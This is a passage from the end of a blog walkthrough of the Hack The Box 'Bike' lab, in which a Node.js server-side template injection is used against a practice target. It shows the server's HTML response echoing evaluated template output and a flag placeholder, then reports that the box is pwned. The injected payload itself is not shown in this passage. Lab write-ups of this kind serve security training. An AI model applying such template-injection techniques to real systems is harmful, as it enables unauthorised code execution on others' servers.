</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>container</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span>
</span></span><span class=line><span class=cl>    <span class=na>src</span><span class=o>=</span><span class=s>&#34;images/buttons.gif&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>id</span><span class=o>=</span><span class=s>&#34;avatar&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;type-wrap&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>span</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;typed&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;white-space:pre;&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;typed&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;contact&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>We can let you know once we are up and running.<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fields&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;form&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;E-mail&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;button-54&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;result&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        We will contact you at:       e
</span></span><span class=line><span class=cl>      2
</span></span><span class=line><span class=cl>      [object Object]
</span></span><span class=line><span class=cl>        function Function() { [native code] }
</span></span><span class=line><span class=cl>        2
</span></span><span class=line><span class=cl>        [object Object]
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>flag</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/typed.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/main.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>This is how it looks like in <strong>burp</strong>:</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/burp-repeater-payload-2.png alt=burp-repeater-payload-2 title=burp-repeater-payload-2></p><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/bike/>bike</a></li><li><a href=https://bluewalle.github.io/tags/tier-1/>tier-1</a></li><li><a href=https://bluewalle.github.io/tags/vip-tier/>vip-tier</a></li><li><a href=https://bluewalle.github.io/tags/javascript/>javascript</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/injection/>injection</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/nodejs/>nodejs</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/server-side-template-injection/>server-side-template-injection</a></li><li><a href=https://bluewalle.github.io/tags/ssti/>ssti</a></li><li><a href=https://bluewalle.github.io/tags/linux-target/>linux-target</a></li><li><a href=https://bluewalle.github.io/tags/difficulty-easy/>difficulty-easy</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>